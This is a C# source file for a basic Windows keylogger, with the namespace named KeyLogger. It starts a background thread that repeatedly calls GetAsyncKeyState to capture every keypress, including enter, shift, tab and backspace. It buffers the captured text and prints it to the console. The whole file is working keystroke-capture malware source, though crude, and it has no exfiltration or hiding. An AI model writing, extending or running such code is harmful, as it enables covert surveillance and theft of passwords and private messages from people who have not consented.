using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLogger
{
    class Program {
        public bool islogging = false;
        public string loggedData = "";
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int key);
        public void logkeyStrokes()
        {
            this.islogging = true;
            int key;
            while (this.islogging)
            {
                for(key = 8; key < 190; key++)
                {
                    if(GetAsyncKeyState(key) == -32767)
                    {
                        this.checkKeys(key);
                    }
                }
            }
        }
        public void checkKeys(int keyCode)
        {
            switch(keyCode)
            {
                case 8:
                    if (!string.IsNullOrEmpty(this.loggedData))
                    {
                        this.loggedData = this.loggedData.Substring(0, this.loggedData.Length - 1);
                    }
                    break;
                case 9:
                    this.loggedData += "    ";
                    break;
                case 13:
                    this.loggedData += " [ENTER] ";
                    break;
                case 16:
                    this.loggedData += " [SHIFT] ";
                    break;
                default:
                    this.loggedData += (char)keyCode;
                    break;               
            }
            if(this.loggedData.Length >= 4)
            {
                Console.Write(this.loggedData);
                this.loggedData = "";
            }
        }
        public void threadKeyLogging()
        {
            new Thread(new ThreadStart(this.logkeyStrokes)).Start();
        }
        static void Main(string[] args)
        {
            Program p = new Program();
            p.threadKeyLogging();
        }
    }
}
